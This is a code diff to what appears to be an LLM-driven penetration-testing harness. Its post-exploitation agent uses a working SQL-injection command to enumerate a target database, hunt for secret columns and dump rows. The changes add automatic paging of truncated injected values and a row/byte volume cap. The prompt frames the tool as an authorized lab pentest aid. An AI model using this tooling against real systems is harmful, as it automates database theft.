@@ -12804,12 +12804,16 @@ _postex_ea_cache = {"t": 0.0, "fixes": None, "tweaks": None}
 
 
 def _postex_fixes_and_tweaks():
-    """(error_fixes, tweaks) as [(pattern, text)], loaded from the postex_web.yaml SKILL
-    (RAG-first — edit the YAML, not the code). Falls back to the in-code lists. 60s cache."""
+    """(fixes, tweaks, truncation_signals) loaded from the postex_web.yaml SKILL (RAG-first —
+    edit the YAML, not the code). Fixes/tweaks are [(pattern, text)]; truncation_signals are
+    [(pattern, action)] and drive AUTO-PAGE deterministically. Falls back to the in-code
+    lists. 60s cache."""
     import time as _t
     if _postex_ea_cache["fixes"] is not None and _t.time() - _postex_ea_cache["t"] < 60:
-        return _postex_ea_cache["fixes"], _postex_ea_cache["tweaks"]
+        return (_postex_ea_cache["fixes"], _postex_ea_cache["tweaks"],
+                _postex_ea_cache.get("truncation") or [])
     fixes, tweaks = list(_POSTEX_ERROR_FIXES), list(_POSTEX_TWEAKS)
+    truncation = []
     try:
         from common import vuln_skills as _vs
         ea = _vs.postex_error_analysis() or {}
@@ -12817,26 +12821,32 @@ def _postex_fixes_and_tweaks():
               if isinstance(r, dict) and r.get("match") and r.get("fix")]
         st = [(r["match"], r["tweak"]) for r in (ea.get("tweaks") or [])
               if isinstance(r, dict) and r.get("match") and r.get("tweak")]
+        tr = [(r["match"], r.get("action", ""), r.get("id", "")) for r in (ea.get("truncation_signals") or [])
+              if isinstance(r, dict) and r.get("match")]
         if sf:
             fixes = sf
         if st:
             tweaks = st
+        truncation = tr
     except Exception:  # noqa: BLE001
         pass
-    _postex_ea_cache.update(t=_t.time(), fixes=fixes, tweaks=tweaks)
-    return fixes, tweaks
+    _postex_ea_cache.update(t=_t.time(), fixes=fixes, tweaks=tweaks, truncation=truncation)
+    return fixes, tweaks, truncation
 
 
 def _enumerate_postex_output(output):
-    """Enumerate a post-ex command's output. Returns {errors, tweaks, exec, empty}:
+    """Enumerate a post-ex command's output. Returns
+    {errors, tweaks, truncated, truncation_signal, truncation_action, exec, empty}:
       * errors  — deterministic FIXES for a failed command (from the postex_web skill),
-      * tweaks  — improvements when it worked but the output is encoded/truncated/partial,
+      * tweaks  — improvements when the output is encoded/partial (softer than truncation),
+      * truncated / truncation_signal / truncation_action — FIRST-CLASS SIGNAL (from the
+        skill's truncation_signals): "MySQL cut the value at 32 chars → auto-page it now."
       * exec    — the engine ran our input (progress, not failure).
-    Structural discovery (which tables/columns/files) is left to the LLM, which reads the raw
-    output; these give it the deterministic nudges for fixing and improving."""
+    Structural discovery (which tables/columns/files) is left to the LLM; these deterministic
+    signals give the harness enough to act without asking."""
     import re as _re
-    low = (output or "").lower()
-    fixes, tweaks = _postex_fixes_and_tweaks()
+    o = output or ""; low = o.lower()
+    fixes, tweaks, truncation = _postex_fixes_and_tweaks()
     errs = []
     for pat, fix in fixes:
         try:
@@ -12847,13 +12857,22 @@ def _enumerate_postex_output(output):
     tws = []
     for pat, tw in tweaks:
         try:
-            if _re.search(pat, output or "", _re.I):
+            if _re.search(pat, o, _re.I):
                 tws.append(tw)
         except Exception:  # noqa: BLE001
             continue
-    return {"errors": errs, "tweaks": tws,
-            "exec": _looks_like_injection_execution(output),
-            "empty": not (output or "").strip()}
+    # First-class TRUNCATION detection — skill-driven, drives auto-page deterministically.
+    truncated = False; sig_id = None; sig_action = None
+    for pat, action, sid in truncation:
+        try:
+            if _re.search(pat, o, _re.I):
+                truncated = True; sig_id = sid; sig_action = action; break
+        except Exception:  # noqa: BLE001
+            continue
+    return {"errors": errs, "tweaks": tws, "truncated": truncated,
+            "truncation_signal": sig_id, "truncation_action": sig_action,
+            "exec": _looks_like_injection_execution(o),
+            "empty": not o.strip()}
 
 
 def _postex_run(command, ip, port):
@@ -12973,6 +12992,56 @@ def _postex_filter_secret_columns(cols_or_pairs, patterns=None):
     return [x for x in items if pat.search(x.rsplit(".", 1)[-1])]
 
 
+def _postex_volume_gate_config():
+    """Read the volume-gate policy from the postex_web skill (RAG-first). Falls back to
+    conservative defaults. The gate refuses/limits dumps deterministically — no LLM."""
+    try:
+        from common import vuln_skills as _vs
+        vg = (_vs.postex_collection() or {}).get("volume_gate") or {}
+    except Exception:  # noqa: BLE001
+        vg = {}
+    return {
+        "default_max_rows": int(vg.get("default_max_rows") or 1000),
+        "hard_max_rows": int(vg.get("hard_max_rows") or 10000),
+        "warn_bytes": int(vg.get("warn_bytes") or 1_048_576),
+        "hard_max_bytes": int(vg.get("hard_max_bytes") or 10_485_760),
+        "default_row_bytes_estimate": int(vg.get("default_row_bytes_estimate") or 200),
+    }
+
+
+def _postex_check_volume(row_count, est_row_bytes=None, override_max_rows=None):
+    """Deterministic pre-dump volume gate. Given a row count (int or None) and an optional
+    per-row bytes estimate, return {allow, limit, reason} using the skill's policy. This is
+    the "don't pull terabytes by accident" safety — enforced BEFORE the data stage runs."""
+    cfg = _postex_volume_gate_config()
+    if row_count is None:
+        return {"allow": False, "limit": None,
+                "reason": "no verified row_count — cannot proceed to data (skill policy)"}
+    try:
+        rc = int(str(row_count).strip().split()[0])
+    except Exception:  # noqa: BLE001
+        return {"allow": False, "limit": None,
+                "reason": f"row_count is not an integer ({row_count!r}) — refusing dump"}
+    max_rows = int(override_max_rows) if override_max_rows else cfg["default_max_rows"]
+    hard_rows = cfg["hard_max_rows"]
+    per_row = int(est_row_bytes) if est_row_bytes else cfg["default_row_bytes_estimate"]
+    est_bytes = rc * per_row
+    if rc > hard_rows:
+        return {"allow": False, "limit": None,
+                "reason": f"row_count {rc} exceeds hard_max_rows {hard_rows} — operator must "
+                          f"raise the cap explicitly (skill policy)"}
+    if est_bytes > cfg["hard_max_bytes"]:
+        return {"allow": False, "limit": None,
+                "reason": f"estimated dump {est_bytes} bytes exceeds hard_max_bytes "
+                          f"{cfg['hard_max_bytes']} — refused"}
+    if rc > max_rows or est_bytes > cfg["warn_bytes"]:
+        return {"allow": True, "limit": max_rows,
+                "reason": f"row_count {rc} / est {est_bytes} bytes exceeds soft cap — auto-LIMIT "
+                          f"{max_rows} rows applied (adjust with per-run override)"}
+    return {"allow": True, "limit": None,
+            "reason": f"within policy ({rc} rows, ~{est_bytes} bytes) — full dump allowed"}
+
+
 def _postex_primitive_registry():
     """Name -> callable + one-line description. This IS the set of composable skills the
     collect agent can invoke by name. Declared in postex_web.yaml `primitives:` for RAG."""
@@ -13082,10 +13151,25 @@ def _collect_data_agent(cve, ip, port, working_command, objective, vuln_class, e
                   "secret_columns": None, "row_count": None}
     command = ""; output = ""; extracted = False; data = ""; llm_model = None
     stage_i = 0; attempts = 0; iters = 0
+    volume_gate_result = None  # set once when we transition into the data stage
     while stage_i < len(plan) and iters < max_iters:
         iters += 1
         stage = plan[stage_i]
+        # VOLUME GATE — deterministic; before dumping, verify row_count and apply a LIMIT (or
+        # refuse) per the skill's policy. Runs ONCE at the top of the `data` stage.
+        if stage["stage"] == "data" and volume_gate_result is None:
+            volume_gate_result = _postex_check_volume(discovered.get("row_count"))
+            facts.append("VOLUME GATE: %s" % volume_gate_result["reason"])
+            if not volume_gate_result["allow"]:
+                _poc_trace(run_id, "volume_gate_refuse", iteration=iters,
+                           response=volume_gate_result["reason"])
+                break  # refuse to run the data stage; return extracted=False
         sqlite_hint = (" (SQLite: %s)" % stage.get("sqlite")) if stage.get("sqlite") else ""
+        gate_hint = ""
+        if stage["stage"] == "data" and volume_gate_result and volume_gate_result.get("limit"):
+            gate_hint = ("VOLUME GATE ACTIVE: append `LIMIT %d` to every dump subquery — the "
+                         "volume gate refuses larger dumps (%s)." %
+                         (volume_gate_result["limit"], volume_gate_result["reason"]))
         prompt = (
             "AUTHORIZED lab pentest DATA-COLLECTION agent. The %s exploit is CORRECTED and "
             "WORKING on %s. %s\n"
@@ -13099,7 +13183,8 @@ def _collect_data_agent(cve, ip, port, working_command, objective, vuln_class, e
             "PRIMITIVES available (pick ONE per turn):\n%s\n"
             "Rules: NEVER emit a curl command. Pick a PRIMITIVE and give its args (SQL "
             "subquery or column list). If the previous value looked TRUNCATED at 32 chars, "
-            "use sqli_autopage. Fill <TABLE>/<COLS> from Discovered before you invoke.\n"
+            "use sqli_autopage. Fill <TABLE>/<COLS> from Discovered before you invoke. "
+            "%s\n"
             "Return ONE JSON only: {\"primitive\": \"<name>\", \"args\": {...}, "
             "\"target_table\": \"<table you are targeting, if known>\", "
             "\"stage_value\": \"<this stage's answer if the LAST output already contains "
@@ -13108,7 +13193,7 @@ def _collect_data_agent(cve, ip, port, working_command, objective, vuln_class, e
             "\"note\": \"<what you learned>\"}."
         ) % (vuln_class, tgt, auth, working_command, methodology, stage["stage"],
              stage.get("goal"), stage.get("subquery"), sqlite_hint, discovered, objective,
-             (output or "(none yet)")[:1400], prim_catalog)
+             (output or "(none yet)")[:1400], prim_catalog, gate_hint)
         res = _llm_for_model(prompt, model=model, caller="postex_collect", num_predict=700)
         if isinstance(res, dict) and res.get("model"):
             llm_model = res["model"]
@@ -13154,13 +13239,29 @@ def _collect_data_agent(cve, ip, port, working_command, objective, vuln_class, e
                            prompt=str(args)[:300], response=(str(out_val) if out_val is not None else "")[:400])
             except Exception as e:  # noqa: BLE001
                 facts.append("primitive %s failed: %s" % (prim_name, str(e)[:80]))
-        # Enumerate whatever came back (errors/tweaks feed forward)
+        # Enumerate whatever came back (errors/tweaks/TRUNCATION feed forward)
         if output:
             enum = _enumerate_postex_output(output)
             for f in enum["errors"]:
                 facts.append("FIX: " + f)
             for tw in enum["tweaks"]:
                 facts.append("TWEAK: " + tw)
+            # First-class truncation signal — auto-page the same expression deterministically,
+            # so we do not burn an LLM turn on the boring "the value came back at 32 chars"
+            # decision. The skill's truncation_signals + this branch cover it.
+            if enum.get("truncated") and prim_name == "sqli_subquery" and args.get("subquery"):
+                facts.append("TRUNCATED (%s) — auto-paging deterministically" %
+                             (enum.get("truncation_signal") or "detected"))
+                sub_expr = "(%s)" % str(args["subquery"]).strip().rstrip(";")
+                try:
+                    full = _postex_autopage(working_command, sub_expr, ip, port)
+                except Exception as e:  # noqa: BLE001
+                    full = None; facts.append("autopage failed: %s" % str(e)[:80])
+                if full:
+                    val = full
+                    output = "AUTOPAGED: " + str(full)[:600]
+                    _poc_trace(run_id, "auto_autopage", iteration=iters,
+                               prompt=sub_expr[:300], response=str(full)[:400])
         # Advance stage on real progress
         if val:
             facts.append("STAGE %s: %s" % (stage["stage"], str(val)[:100]))
